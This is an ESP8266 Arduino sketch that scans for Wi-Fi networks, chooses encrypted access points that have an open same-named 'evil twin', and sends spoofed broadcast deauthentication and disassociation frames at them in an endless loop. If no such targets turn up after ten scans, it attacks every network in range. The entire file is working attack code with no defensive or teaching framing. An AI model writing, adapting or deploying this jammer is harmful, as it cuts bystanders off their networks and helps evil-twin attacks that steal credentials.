#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}


#define BAUD_RATE       9600
#define SCAN_INTERVAL   5000
#define MAX_SCAN_CYCLES 10
#define MAX_ATTEMPTS    10

struct ap {
  String SSID;
  uint8_t* BSSID;
  int channel;
  bool open;
};

long lastScanMillis;
int noTargetCounter;

uint8_t deauthPacket[26] = {
    0xC0, 0x00,                           //  0 - 1  : Type, Subtype (C0: Deauthenticate, A0: Disassociate)
    0x00, 0x00,                           //  2 - 3  : Packet Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   //  4 - 9  : Destination Address (Broadcast)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // 10 - 15 : Source Address
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // 16 - 21 : Source Address
    0x00, 0x00,                           // 22 - 23 : Fragment, Sequence Number
    0x01, 0x00                            // 24 - 25 : Reason Code (01: Unspecified Reason)
};


void setup() {
  Serial.begin(BAUD_RATE);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(1000);
  noTargetCounter = 0;
}


void getAccessPoints(ap accessPoints[], int n) {
  for (int i = 0; i < n; i++) {
    bool open = WiFi.encryptionType(i) == ENC_TYPE_NONE;
    ap currentAP = {WiFi.SSID(i), WiFi.BSSID(i), WiFi.channel(i), open};
    accessPoints[i] = currentAP;
  }
}

bool hasEvilTwin(ap accessPoint, ap accessPoints[], int n) {
  for (int i = 0; i < n; i++) {
    ap currentAP = accessPoints[i];
    if (currentAP.open && currentAP.SSID == accessPoint.SSID)
      return true;
  }
  return false;
}

int getTargets(ap targets[], ap accessPoints[], int n) {
  int m = 0;
  for (int i = 0; i < n; i++) {
    ap currentAP = accessPoints[i];
    if (!currentAP.open && hasEvilTwin(currentAP, accessPoints, n)) {
      targets[m] = currentAP;
      m++;
    }
  }
  return m;
}

bool sendPacket(int channel) {
  wifi_set_channel(channel);
  bool sent = wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0;
  for (int i = 0; i < MAX_ATTEMPTS && !sent; i++)
    sent = wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0;
  return sent;
}

void attack(ap targets[], int n) {
  Serial.println("\nStarting attack ...");
  while (true) {
    for (int i = 0; i < n; i++) {
      ap currentAP = targets[i];
      memcpy(&deauthPacket[10], currentAP.BSSID, 6);
      memcpy(&deauthPacket[16], currentAP.BSSID, 6);
      Serial.print("\nDeauthenticating ");
      Serial.println(currentAP.SSID);
      deauthPacket[0] = 0xC0;
      bool d1 = sendPacket(currentAP.channel);
      Serial.print("Disassociating ");
      Serial.println(currentAP.SSID);
      deauthPacket[0] = 0xA0;
      bool d2 = sendPacket(currentAP.channel);
      Serial.println((d1 && d2) ? "DONE!" : "ERROR!");
    }
    delay(100);
  }
}

void loop() {

  long currentMillis = millis();
  if (currentMillis - lastScanMillis > SCAN_INTERVAL) {
    Serial.println("\nScanning ...");
    WiFi.scanNetworks(true);
    lastScanMillis = currentMillis;
  }

  int n = WiFi.scanComplete();
  if (n >= 0) {

    Serial.printf("Found %d network(s)\n", n);

    ap accessPoints[n];
    getAccessPoints(accessPoints, n);

    if (noTargetCounter > MAX_SCAN_CYCLES) {
      Serial.println("Attacking all ...");
      attack(accessPoints, n);
    } else {
      ap targets[n];
      int m = getTargets(targets, accessPoints, n);
      Serial.printf("Found %d target(s)\n", m);
      if (m > 0) attack(targets, m);
    }

    WiFi.scanDelete();
    noTargetCounter++;

  }

}
